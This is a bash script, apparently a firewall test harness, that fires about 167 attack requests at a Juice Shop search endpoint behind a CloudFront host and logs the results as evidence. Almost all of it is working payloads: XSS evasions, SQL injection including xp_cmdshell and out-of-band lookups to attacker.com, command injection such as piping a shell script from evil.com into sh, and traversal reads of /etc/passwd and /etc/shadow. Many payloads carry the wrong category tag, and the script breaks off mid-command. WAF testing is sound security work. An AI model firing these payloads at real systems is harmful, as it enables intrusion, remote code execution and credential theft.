#!/usr/bin/env bash
# REVISED: each curl injects a unique X-Request-Id and logs it to a mapping CSV.
# Run end-to-end, then run pull_raw_cloudwatch.py to fetch CF + ALB CW logs.
#
# Output:
#   $EVIDENCE_DIR/request_id_mapping.csv          (appended to)
#   $EVIDENCE_DIR/responses/<profile>/<rid>.txt   (full curl response per request)
#
# Override paths via env: EVIDENCE_DIR, MAPPING_FILE.
set -uo pipefail

USER_AGENT="dlpaasrngb6ue.cloudfront.net"
HOST="https://dlpaasrngb6ue.cloudfront.net"
URI="/rest/products/search"
METHOD_PROFILE="get_querystring"

EVIDENCE_DIR="${EVIDENCE_DIR:-$HOME/Downloads/evidence}"
MAPPING_FILE="${MAPPING_FILE:-$EVIDENCE_DIR/request_id_mapping.csv}"
RESP_DIR="$EVIDENCE_DIR/responses/$METHOD_PROFILE"
mkdir -p "$RESP_DIR" "$(dirname "$MAPPING_FILE")"

if [ ! -f "$MAPPING_FILE" ]; then
  echo '"method_profile","test_id","tuning","request_id","http_status","timestamp_utc","response_file"' > "$MAPPING_FILE"
fi

gen_rid() {
  if command -v uuidgen >/dev/null 2>&1; then
    printf 'waf-test-%s' "$(uuidgen | tr '[:upper:]' '[:lower:]')"
  else
    printf 'waf-test-%s' "$(python3 -c 'import uuid; print(uuid.uuid4())')"
  fi
}

# do_curl <test_id> <tuning> <payload-preview> -- <curl args...>
# (User-Agent + X-Request-Id are added automatically; do not pass them.)
do_curl() {
  local test_id="$1" tuning="$2" payload="$3"; shift 3
  local rid; rid="$(gen_rid)"
  echo "=== $test_id | tuning=$tuning | method=$METHOD_PROFILE | rid=$rid ==="
  printf '    payload: %s\n' "$payload"
  local resp_file="$RESP_DIR/$rid.txt"
  curl -sk -i -m 15 -H "X-Request-Id: $rid" -H "User-Agent: $USER_AGENT" "$@" > "$resp_file" 2>&1
  head -8 "$resp_file"
  local status; status="$(grep -m1 '^HTTP/' "$resp_file" | awk '{print $2}')"
  local ts; ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf '"%s","%s","%s","%s","%s","%s","%s"\n' \
    "$METHOD_PROFILE" "$test_id" "$tuning" "$rid" "$status" "$ts" "$resp_file" >> "$MAPPING_FILE"
  echo
}

# ---------- Tests ----------
do_curl 'juiceshop-0001' 'xss' '<script>alert(1)</script>' \
  "$HOST$URI?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0002' 'xss' '%253Cscript%253Ealert(1)%253C/script%253E' \
  "$HOST$URI?q=%25253Cscript%25253Ealert%281%29%25253C%2Fscript%25253E"
do_curl 'juiceshop-0003' 'xss' '&lt;script&gt;alert(1)&lt;/script&gt;' \
  "$HOST$URI?q=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B"
do_curl 'juiceshop-0004' 'xss' '<scr<script>ipt>alert(1)</scr</script>ipt>' \
  "$HOST$URI?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
do_curl 'juiceshop-0005' 'xss' '<script>alert&#40;1&#41;</script>' \
  "$HOST$URI?q=%3Cscript%3Ealert%26%2340%3B1%26%2341%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0006' 'xss' '<script>alert\\x281\\x29</script>' \
  "$HOST$URI?q=%3Cscript%3Ealert%5C%5Cx281%5C%5Cx29%3C%2Fscript%3E"
do_curl 'juiceshop-0007' 'xss' '<script>alert\\u00281\\u0029</script>' \
  "$HOST$URI?q=%3Cscript%3Ealert%5C%5Cu00281%5C%5Cu0029%3C%2Fscript%3E"
do_curl 'juiceshop-0008' 'xss' '%u003Cscript%u003Ealert(1)%u003C/script%u003E' \
  "$HOST$URI?q=%25u003Cscript%25u003Ealert%281%29%25u003C%2Fscript%25u003E"
do_curl 'juiceshop-0009' 'xss' '%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E' \
  "$HOST$URI?q=%253Cscript%253Eeval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%253C%2Fscript%253E"
do_curl 'juiceshop-0010' 'xss' '%3cscript%3ealert(1)%3c%2fscript%3e' \
  "$HOST$URI?q=%253cscript%253ealert%281%29%253c%252fscript%253e"
do_curl 'juiceshop-0011' 'xss' '%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E' \
  "$HOST$URI?q=%253Csvg%2520onload%253D%2522confirm%2528document.domain%2529%2522%253E"
do_curl 'juiceshop-0012' 'xss' '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' \
  "$HOST$URI?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert%281%29%253E"
do_curl 'juiceshop-0013' 'xss' '%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E' \
  "$HOST$URI?q=%253Ciframe%2520src%253D%2522javascript%253Aalert%281%29%2522%253E"
do_curl 'juiceshop-0014' 'xss' '%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E' \
  "$HOST$URI?q=%253Cscrscriptipt%253Ealert%25281%2529%253C%252Fscrscriptipt%253E"
do_curl 'juiceshop-0015' 'xss' '%u003Cscript%u003Ealert(1)%u003C%2Fscript%u003E' \
  "$HOST$URI?q=%25u003Cscript%25u003Ealert%281%29%25u003C%252Fscript%25u003E"
do_curl 'juiceshop-0016' 'xss' '"><script>alert(1)</script>' \
  "$HOST$URI?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0017' 'xss' '<svg/onload=alert(1)>' \
  "$HOST$URI?q=%3Csvg%2Fonload%3Dalert%281%29%3E"
do_curl 'juiceshop-0018' 'xss' '<iframe src="javascript:alert(1)">' \
  "$HOST$URI?q=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E"
do_curl 'juiceshop-0019' 'xss' '<IMG SRC="javascript:alert('\''XSS'\'');">' \
  "$HOST$URI?q=%3CIMG%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E"
do_curl 'juiceshop-0020' 'xss' '<svg><script xlink:href=data:,alert(1)>' \
  "$HOST$URI?q=%3Csvg%3E%3Cscript%20xlink%3Ahref%3Ddata%3A%2Calert%281%29%3E"
do_curl 'juiceshop-0021' 'xss' '<math><mi//xlink:href="data:x,alert(1)">' \
  "$HOST$URI?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2Calert%281%29%22%3E"
do_curl 'juiceshop-0022' 'xss' '<script>window </script>' \
  "$HOST$URI?q=%3Cscript%3Ewindow%20%3C%2Fscript%3E"
do_curl 'juiceshop-0023' 'xss' '"><img src=x onerror=alert(1)>' \
  "$HOST$URI?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
do_curl 'juiceshop-0024' 'xss' '%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \
  "$HOST$URI?q=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"
do_curl 'juiceshop-0025' 'xss' '%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E' \
  "$HOST$URI?q=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E"
do_curl 'juiceshop-0026' 'xss' '<scr<script>ipt>alert(1)</script>' \
  "$HOST$URI?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0027' 'xss' '<scri%00pt>alert(1)</scri%00pt>' \
  "$HOST$URI?q=%3Cscri%2500pt%3Ealert%281%29%3C%2Fscri%2500pt%3E"
do_curl 'juiceshop-0028' 'xss' '<script>\\u0061lert(1)</script>' \
  "$HOST$URI?q=%3Cscript%3E%5C%5Cu0061lert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0029' 'xss' '<iframe/src=javascript:alert(1)>' \
  "$HOST$URI?q=%3Ciframe%2Fsrc%3Djavascript%3Aalert%281%29%3E"
do_curl 'juiceshop-0030' 'xss' '<svg%0Aonload=alert(1)>' \
  "$HOST$URI?q=%3Csvg%250Aonload%3Dalert%281%29%3E"
do_curl 'juiceshop-0031' 'xss' '"><img src=x o%6ener%72=alert(1)>' \
  "$HOST$URI?q=%22%3E%3Cimg%20src%3Dx%20o%256ener%2572%3Dalert%281%29%3E"
do_curl 'juiceshop-0032' 'xss' '%3Cscript%3Ealert(1)%3C%2Fscript%3E' \
  "$HOST$URI?q=%253Cscript%253Ealert%281%29%253C%252Fscript%253E"
do_curl 'juiceshop-0033' 'xss' '%3Csvg%2Fonload%3Dalert(1)%3E' \
  "$HOST$URI?q=%253Csvg%252Fonload%253Dalert%281%29%253E"
do_curl 'juiceshop-0034' 'xss' '<img src=x onerror=alert(1)>' \
  "$HOST$URI?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
do_curl 'juiceshop-0035' 'xss' '&lt;img src=x onerror=alert(1)&gt;' \
  "$HOST$URI?q=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert%281%29%26gt%3B"
do_curl 'juiceshop-0036' 'base64' 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' \
  "$HOST$URI?q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D"
do_curl 'juiceshop-0037' 'xss' '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>' \
  "$HOST$URI?q=%3Cscr%3C%21--%20--%3Eipt%3Ealert%281%29%3C%2Fscr%3C%21--%20--%3Eipt%3E"
do_curl 'juiceshop-0038' 'xss' '?a=<scr&b=ipt>alert(1)</script>' \
  "$HOST$URI?q=%3Fa%3D%3Cscr%26b%3Dipt%3Ealert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0039' 'xss' '<scr + ipt>alert(1)</script>' \
  "$HOST$URI?q=%3Cscr%20%2B%20ipt%3Ealert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0040' 'xss' '< + script>alert(1)</script>' \
  "$HOST$URI?q=%3C%20%2B%20script%3Ealert%281%29%3C%2Fscript%3E"
do_curl 'juiceshop-0041' 'sqli' ''\'' OR '\'' + 1=1 + --' \
  "$HOST$URI?q=%27%20OR%20%27%20%2B%201%3D1%20%2B%20--"
do_curl 'juiceshop-0042' 'sqli' 'id='\'' OR '\''&id=1=1--' \
  "$HOST$URI?q=id%3D%27%20OR%20%27%26id%3D1%3D1--"
do_curl 'juiceshop-0043' 'sqli' ''\''/**/OR/**/1=1--' \
  "$HOST$URI?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--"
do_curl 'juiceshop-0044' 'sqli' ''\'' OR '\''1'\''='\''1' \
  "$HOST$URI?q=%27%20OR%20%271%27%3D%271"
do_curl 'juiceshop-0045' 'sqli' ''\'' OR 1=1 --' \
  "$HOST$URI?q=%27%20OR%201%3D1%20--"
do_curl 'juiceshop-0046' 'sqli' ''\'' OR 1=1#' \
  "$HOST$URI?q=%27%20OR%201%3D1%23"
do_curl 'juiceshop-0047' 'sqli' ''\'') OR ('\''1'\''='\''1' \
  "$HOST$URI?q=%27%29%20OR%20%28%271%27%3D%271"
do_curl 'juiceshop-0048' 'sqli' 'admin'\'' --' \
  "$HOST$URI?q=admin%27%20--"
do_curl 'juiceshop-0049' 'sqli' 'admin'\'' #' \
  "$HOST$URI?q=admin%27%20%23"
do_curl 'juiceshop-0050' 'sqli' '%27%20OR%201=1--' \
  "$HOST$URI?q=%2527%2520OR%25201%3D1--"
do_curl 'juiceshop-0051' 'sqli' '%27%20OR%20%271%27=%271' \
  "$HOST$URI?q=%2527%2520OR%2520%25271%2527%3D%25271"
do_curl 'juiceshop-0052' 'sqli' '%27%20OR%20%271%27=%271%27--' \
  "$HOST$URI?q=%2527%2520OR%2520%25271%2527%3D%25271%2527--"
do_curl 'juiceshop-0053' 'sqli' '%2527%2520OR%25201%253D1--' \
  "$HOST$URI?q=%252527%252520OR%2525201%25253D1--"
do_curl 'juiceshop-0054' 'sqli' '%27OR+1%3D1--' \
  "$HOST$URI?q=%2527OR%2B1%253D1--"
do_curl 'juiceshop-0055' 'sqli' '%27+OR+1%3D1--' \
  "$HOST$URI?q=%2527%2BOR%2B1%253D1--"
do_curl 'juiceshop-0056' 'sqli' '%27--+' \
  "$HOST$URI?q=%2527--%2B"
do_curl 'juiceshop-0057' 'xss' '%27%23' \
  "$HOST$URI?q=%2527%2523"
do_curl 'juiceshop-0058' 'xss' '%2F%2A%2A%2F' \
  "$HOST$URI?q=%252F%252A%252A%252F"
do_curl 'juiceshop-0059' 'sqli' '%27)%20OR%20(%271%27=%271' \
  "$HOST$URI?q=%2527%29%2520OR%2520%28%25271%2527%3D%25271"
do_curl 'juiceshop-0060' 'sqli' ''\'')%20OR%20('\''1'\''='\''1' \
  "$HOST$URI?q=%27%29%2520OR%2520%28%271%27%3D%271"
do_curl 'juiceshop-0061' 'sqli' ''\''||'\''1'\''='\''1' \
  "$HOST$URI?q=%27%7C%7C%271%27%3D%271"
do_curl 'juiceshop-0062' 'sqli' '%df'\'' OR 1=1--' \
  "$HOST$URI?q=%25df%27%20OR%201%3D1--"
do_curl 'juiceshop-0063' 'sqli' ''\'';WAITFOR DELAY '\''0:0:5'\''--' \
  "$HOST$URI?q=%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--"
do_curl 'juiceshop-0064' 'sqli' ''\'' AND SLEEP(5)--' \
  "$HOST$URI?q=%27%20AND%20SLEEP%285%29--"
do_curl 'juiceshop-0065' 'sqli' ''\''||UTL_INADDR.get_host_address('\''attacker.com'\'')||'\''' \
  "$HOST$URI?q=%27%7C%7CUTL_INADDR.get_host_address%28%27attacker.com%27%29%7C%7C%27"
do_curl 'juiceshop-0066' 'sqli' '%27%20OR%201%3D1%20--%20' \
  "$HOST$URI?q=%2527%2520OR%25201%253D1%2520--%2520"
do_curl 'juiceshop-0067' 'sqli' '%27)%20OR%20('\''1'\''%3D'\''1' \
  "$HOST$URI?q=%2527%29%2520OR%2520%28%271%27%253D%271"
do_curl 'juiceshop-0068' 'sqli' '%25%27%20OR%20%271%27%3D%271' \
  "$HOST$URI?q=%2525%2527%2520OR%2520%25271%2527%253D%25271"
do_curl 'juiceshop-0069' 'sqli' '%27%20OR%201=1%20--%20' \
  "$HOST$URI?q=%2527%2520OR%25201%3D1%2520--%2520"
do_curl 'juiceshop-0070' 'sqli' '%27%20UNION%20SELECT%201,2,3--' \
  "$HOST$URI?q=%2527%2520UNION%2520SELECT%25201%2C2%2C3--"
do_curl 'juiceshop-0071' 'sqli' 'admin%27--+' \
  "$HOST$URI?q=admin%2527--%2B"
do_curl 'juiceshop-0072' 'sqli' 'admin%27%2f%2a%2a%2f--' \
  "$HOST$URI?q=admin%2527%252f%252a%252a%252f--"
do_curl 'juiceshop-0073' 'sqli' '%27/**/OR/**/1=1--' \
  "$HOST$URI?q=%2527%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--"
do_curl 'juiceshop-0074' 'sqli' '%27%2bOR%2b1%3d1--' \
  "$HOST$URI?q=%2527%252bOR%252b1%253d1--"
do_curl 'juiceshop-0075' 'sqli' '%60%27%20OR%201=1--' \
  "$HOST$URI?q=%2560%2527%2520OR%25201%3D1--"
do_curl 'juiceshop-0076' 'sqli' '%2527%2520OR%25201%253D1--+' \
  "$HOST$URI?q=%252527%252520OR%2525201%25253D1--%2B"
do_curl 'juiceshop-0077' 'sqli' '%27%2b%4f%52%2b1%3d1--+' \
  "$HOST$URI?q=%2527%252b%254f%2552%252b1%253d1--%2B"
do_curl 'juiceshop-0078' 'sqli' '%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+' \
  "$HOST$URI?q=%252527%252f%252a%252a%252f%252bOR%252b1%253D1--%2B"
do_curl 'juiceshop-0079' 'sqli' '%27||CHR(65)||CHR(66)||CHR(67)--' \
  "$HOST$URI?q=%2527%7C%7CCHR%2865%29%7C%7CCHR%2866%29%7C%7CCHR%2867%29--"
do_curl 'juiceshop-0080' 'sqli' '0%27%20UNION%20SELECT%20null,null,null--+' \
  "$HOST$URI?q=0%2527%2520UNION%2520SELECT%2520null%2Cnull%2Cnull--%2B"
do_curl 'juiceshop-0081' 'sqli' ''\'' OR 1=1--' \
  "$HOST$URI?q=%27%20OR%201%3D1--"
do_curl 'juiceshop-0082' 'sqli' '" OR "1"="1' \
  "$HOST$URI?q=%22%20OR%20%221%22%3D%221"
do_curl 'juiceshop-0083' 'sqli' ''\'')--' \
  "$HOST$URI?q=%27%29--"
do_curl 'juiceshop-0084' 'sqli' ''\'' UNION SELECT null,null--' \
  "$HOST$URI?q=%27%20UNION%20SELECT%20null%2Cnull--"
do_curl 'juiceshop-0085' 'sqli' ''\'' AND 1=CAST((SELECT @@version) AS int)--' \
  "$HOST$URI?q=%27%20AND%201%3DCAST%28%28SELECT%20%40%40version%29%20AS%20int%29--"
do_curl 'juiceshop-0086' 'sqli' ''\'' AND EXISTS (SELECT * FROM' \
  "$HOST$URI?q=%27%20AND%20EXISTS%20%28SELECT%20%2A%20FROM"
do_curl 'juiceshop-0087' 'sqli' '1'\'' AND '\''1'\''='\''1' \
  "$HOST$URI?q=1%27%20AND%20%271%27%3D%271"
do_curl 'juiceshop-0088' 'sqli' 'admin'\''--' \
  "$HOST$URI?q=admin%27--"
do_curl 'juiceshop-0089' 'sqli' ''\'' OR '\''a'\''='\''a' \
  "$HOST$URI?q=%27%20OR%20%27a%27%3D%27a"
do_curl 'juiceshop-0090' 'sqli' '1=1' \
  "$HOST$URI?q=1%3D1"
do_curl 'juiceshop-0091' 'sqli' '1'\'' AND 1=0 UNION SELECT null, version() --' \
  "$HOST$URI?q=1%27%20AND%201%3D0%20UNION%20SELECT%20null%2C%20version%28%29%20--"
do_curl 'juiceshop-0092' 'sqli' '1'\''; EXEC xp_cmdshell('\''whoami'\'') --' \
  "$HOST$URI?q=1%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29%20--"
do_curl 'juiceshop-0093' 'sqli' '1'\'') OR ('\''1'\''='\''1'\'' --' \
  "$HOST$URI?q=1%27%29%20OR%20%28%271%27%3D%271%27%20--"
do_curl 'juiceshop-0094' 'sqli' '1'\'') AND sleep(5)--' \
  "$HOST$URI?q=1%27%29%20AND%20sleep%285%29--"
do_curl 'juiceshop-0095' 'sqli' '%27%20OR%20%271%27%3D%271' \
  "$HOST$URI?q=%2527%2520OR%2520%25271%2527%253D%25271"
do_curl 'juiceshop-0096' 'sqli' '1%27%20AND%201%3D1%20--' \
  "$HOST$URI?q=1%2527%2520AND%25201%253D1%2520--"
do_curl 'juiceshop-0097' 'sqli' '1%27)%20OR%20(%271%27%3D%271' \
  "$HOST$URI?q=1%2527%29%2520OR%2520%28%25271%2527%253D%25271"
do_curl 'juiceshop-0098' 'base64' 'JyBPUiAnMT0nJz0nMQ==' \
  "$HOST$URI?q=JyBPUiAnMT0nJz0nMQ%3D%3D"
do_curl 'juiceshop-0099' 'sqli' ''\''/**/OR/**/'\''1'\''/**/=/**/'\''1' \
  "$HOST$URI?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2F%3D%2F%2A%2A%2F%271"
do_curl 'juiceshop-0100' 'sqli' ''\''UNION/**/SELECT/**/NULL,NULL--' \
  "$HOST$URI?q=%27UNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--"
do_curl 'juiceshop-0101' 'sqli' '1%a0OR%a01=1' \
  "$HOST$URI?q=1%25a0OR%25a01%3D1"
do_curl 'juiceshop-0102' 'sqli' '1'\''/*!50000OR*/'\''1'\''='\''1' \
  "$HOST$URI?q=1%27%2F%2A%2150000OR%2A%2F%271%27%3D%271"
do_curl 'juiceshop-0103' 'sqli' '1/**/UNION/**/SELECT/**/version()--' \
  "$HOST$URI?q=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fversion%28%29--"
do_curl 'juiceshop-0104' 'xss' ''\''#' \
  "$HOST$URI?q=%27%23"
do_curl 'juiceshop-0105' 'sqli' 'admin'\''--' \
  "$HOST$URI?q=admin%27--"
do_curl 'juiceshop-0106' 'sqli' ''\'' AND sleep(5)--' \
  "$HOST$URI?q=%27%20AND%20sleep%285%29--"
do_curl 'juiceshop-0107' 'sqli' ''\'' OR 1=1 LIMIT 1 OFFSET 1--' \
  "$HOST$URI?q=%27%20OR%201%3D1%20LIMIT%201%20OFFSET%201--"
do_curl 'juiceshop-0108' 'sqli' ''\''||UTL_INADDR.get_host_address('\''evil.com'\'')||' \
  "$HOST$URI?q=%27%7C%7CUTL_INADDR.get_host_address%28%27evil.com%27%29%7C%7C"
do_curl 'juiceshop-0109' 'sqli' ''\''/*!50000UNION*/ SELECT 1,2--' \
  "$HOST$URI?q=%27%2F%2A%2150000UNION%2A%2F%20SELECT%201%2C2--"
do_curl 'juiceshop-0110' 'sqli' ''\''UNION SELECT /*!12345null*/,version()#' \
  "$HOST$URI?q=%27UNION%20SELECT%20%2F%2A%2112345null%2A%2F%2Cversion%28%29%23"
do_curl 'juiceshop-0111' 'sqli' ''\'' /*!OR*/ '\''1'\''='\''1' \
  "$HOST$URI?q=%27%20%2F%2A%21OR%2A%2F%20%271%27%3D%271"
do_curl 'juiceshop-0112' 'sqli' ''\'' OR 1=1-- -' \
  "$HOST$URI?q=%27%20OR%201%3D1--%20-"
do_curl 'juiceshop-0113' 'sqli' '1'\'' OR '\''1'\''='\''1'\'' --+' \
  "$HOST$URI?q=1%27%20OR%20%271%27%3D%271%27%20--%2B"
do_curl 'juiceshop-0114' 'sqli' ''\'' OR 1=1;--+' \
  "$HOST$URI?q=%27%20OR%201%3D1%3B--%2B"
do_curl 'juiceshop-0115' 'sqli' '%27%20OR%201%3D1--+' \
  "$HOST$URI?q=%2527%2520OR%25201%253D1--%2B"
do_curl 'juiceshop-0116' 'sqli' '%27/*!UNION*/%20SELECT%201,2--' \
  "$HOST$URI?q=%2527%2F%2A%21UNION%2A%2F%2520SELECT%25201%2C2--"
do_curl 'juiceshop-0117' 'sqli' '%2527%2520OR%25201%253D1%2520--' \
  "$HOST$URI?q=%252527%252520OR%2525201%25253D1%252520--"
do_curl 'juiceshop-0118' 'cmdi' ';`id`' \
  "$HOST$URI?q=%3B%60id%60"
do_curl 'juiceshop-0119' 'sqli' '%26%26sleep%205' \
  "$HOST$URI?q=%2526%2526sleep%25205"
do_curl 'juiceshop-0120' 'xss' '%26%26cat%20/etc/passwd' \
  "$HOST$URI?q=%2526%2526cat%2520%2Fetc%2Fpasswd"
do_curl 'juiceshop-0121' 'xss' '%3Bping%20-c%204%20evil.com' \
  "$HOST$URI?q=%253Bping%2520-c%25204%2520evil.com"
do_curl 'juiceshop-0122' 'xss' '%60whoami%60' \
  "$HOST$URI?q=%2560whoami%2560"
do_curl 'juiceshop-0123' 'xss' '|curl$\{IFS\}evil.com' \
  "$HOST$URI?q=%7Ccurl%24%5C%7BIFS%5C%7Devil.com"
do_curl 'juiceshop-0124' 'xss' '|wget$\{IFS\}attacker.site%2fshell.sh' \
  "$HOST$URI?q=%7Cwget%24%5C%7BIFS%5C%7Dattacker.site%252fshell.sh"
do_curl 'juiceshop-0125' 'cmdi' '%2526%2526whoami' \
  "$HOST$URI?q=%252526%252526whoami"
do_curl 'juiceshop-0126' 'cmdi' '$\{@print(md5(1234))\}' \
  "$HOST$URI?q=%24%5C%7B%40print%28md5%281234%29%29%5C%7D"
do_curl 'juiceshop-0127' 'xss' 'php://input' \
  "$HOST$URI?q=php%3A%2F%2Finput"
do_curl 'juiceshop-0128' 'xss' ''\'';phpinfo();/*' \
  "$HOST$URI?q=%27%3Bphpinfo%28%29%3B%2F%2A"
do_curl 'juiceshop-0129' 'xss' 'eval(base64_decode($_GET[cmd]))' \
  "$HOST$URI?q=eval%28base64_decode%28%24_GET%5Bcmd%5D%29%29"
do_curl 'juiceshop-0130' 'xss' 'system($_GET['\''cmd'\''])' \
  "$HOST$URI?q=system%28%24_GET%5B%27cmd%27%5D%29"
do_curl 'juiceshop-0131' 'xss' '%60curl$\{IFS\}attacker.com%60' \
  "$HOST$URI?q=%2560curl%24%5C%7BIFS%5C%7Dattacker.com%2560"
do_curl 'juiceshop-0132' 'xss' ''\'';`wget attacker.sh`;//' \
  "$HOST$URI?q=%27%3B%60wget%20attacker.sh%60%3B%2F%2F"
do_curl 'juiceshop-0133' 'cmdi' ';id' \
  "$HOST$URI?q=%3Bid"
do_curl 'juiceshop-0134' 'xss' '| whoami' \
  "$HOST$URI?q=%7C%20whoami"
do_curl 'juiceshop-0135' 'xss' '`whoami`' \
  "$HOST$URI?q=%60whoami%60"
do_curl 'juiceshop-0136' 'xss' '& uname -a' \
  "$HOST$URI?q=%26%20uname%20-a"
do_curl 'juiceshop-0137' 'xss' '&& ping -c 3 attacker.com' \
  "$HOST$URI?q=%26%26%20ping%20-c%203%20attacker.com"
do_curl 'juiceshop-0138' 'xss' '| powershell -Command "whoami"' \
  "$HOST$URI?q=%7C%20powershell%20-Command%20%22whoami%22"
do_curl 'juiceshop-0139' 'xss' '; curl http://evil.com/shell.sh | sh' \
  "$HOST$URI?q=%3B%20curl%20http%3A%2F%2Fevil.com%2Fshell.sh%20%7C%20sh"
do_curl 'juiceshop-0140' 'cmdi' '$\{@print(md5(1))\}' \
  "$HOST$URI?q=%24%5C%7B%40print%28md5%281%29%29%5C%7D"
do_curl 'juiceshop-0141' 'xss' '%26%26%20whoami' \
  "$HOST$URI?q=%2526%2526%2520whoami"
do_curl 'juiceshop-0142' 'cmdi' '%3B%20id' \
  "$HOST$URI?q=%253B%2520id"
do_curl 'juiceshop-0143' 'cmdi' '%60uname%20-a%60' \
  "$HOST$URI?q=%2560uname%2520-a%2560"
do_curl 'juiceshop-0144' 'xss' '|c%75rl http://evil.com' \
  "$HOST$URI?q=%7Cc%2575rl%20http%3A%2F%2Fevil.com"
do_curl 'juiceshop-0145' 'xss' '$IFS$9$IFS$9whoami' \
  "$HOST$URI?q=%24IFS%249%24IFS%249whoami"
do_curl 'juiceshop-0146' 'xss' ';& whoami' \
  "$HOST$URI?q=%3B%26%20whoami"
do_curl 'juiceshop-0147' 'xss' '../../../../../../etc/passwd' \
  "$HOST$URI?q=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
do_curl 'juiceshop-0148' 'xss' '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' \
  "$HOST$URI?q=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
do_curl 'juiceshop-0149' 'xss' '....//....//....//etc/passwd' \
  "$HOST$URI?q=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd"
do_curl 'juiceshop-0150' 'xss' '%2e%2e%2f%2e%2e%2fetc%2fpasswd' \
  "$HOST$URI?q=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
do_curl 'juiceshop-0151' 'xss' '%252e%252e%252fetc%252fpasswd' \
  "$HOST$URI?q=%25252e%25252e%25252fetc%25252fpasswd"
do_curl 'juiceshop-0152' 'xss' 'php://filter/convert.base64-encode/resource=index.php' \
  "$HOST$URI?q=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php"
do_curl 'juiceshop-0153' 'lfi' 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==' \
  "$HOST$URI?q=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgcGhwaW5mbygpOyA%2FPg%3D%3D"
do_curl 'juiceshop-0154' 'xss' '../../../../etc/passwd' \
  "$HOST$URI?q=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
do_curl 'juiceshop-0155' 'xss' '../../../boot.ini' \
  "$HOST$URI?q=..%2F..%2F..%2Fboot.ini"
do_curl 'juiceshop-0156' 'xss' '../../../../../../windows/win.ini' \
  "$HOST$URI?q=..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
do_curl 'juiceshop-0157' 'xss' '../.../.../.../.../.../.../etc/shadow' \
  "$HOST$URI?q=..%2F...%2F...%2F...%2F...%2F...%2F...%2Fetc%2Fshadow"
do_curl 'juiceshop-0158' 'lfi' 'expect://id' \
  "$HOST$URI?q=expect%3A%2F%2Fid"
do_curl 'juiceshop-0159' 'xss' '../../../../../../etc/passwd%00' \
  "$HOST$URI?q=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"
do_curl 'juiceshop-0160' 'xss' '..%2f..%2f..%2f..%2fetc%2fpasswd' \
  "$HOST$URI?q=..%252f..%252f..%252f..%252fetc%252fpasswd"
do_curl 'juiceshop-0161' 'xss' '..%252f..%252f..%252fetc%252fpasswd' \
  "$HOST$URI?q=..%25252f..%25252f..%25252fetc%25252fpasswd"
do_curl 'juiceshop-0162' 'xss' '..//..//..//etc//passwd' \
  "$HOST$URI?q=..%2F%2F..%2F%2F..%2F%2Fetc%2F%2Fpasswd"
do_curl 'juiceshop-0163' 'lfi' '..%c0%af..%c0%afetc%c0%afpasswd' \
  "$HOST$URI?q=..%25c0%25af..%25c0%25afetc%25c0%25afpasswd"
do_curl 'juiceshop-0164' 'xss' '....//....//etc/passwd' \
  "$HOST$URI?q=....%2F%2F....%2F%2Fetc%2Fpasswd"
do_curl 'juiceshop-0165' 'xss' '..%c0%af..%c0%afetc%2fpasswd' \
  "$HOST$URI?q=..%25c0%25af..%25c0%25afetc%252fpasswd"
do_curl 'juiceshop-0166' 'xss' '../../../etc/passwd' \
  "$HOST$URI?q=..%2F..%2F..%2Fetc%2Fpasswd"
do_curl 'juiceshop-0167' 'xss' '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' \
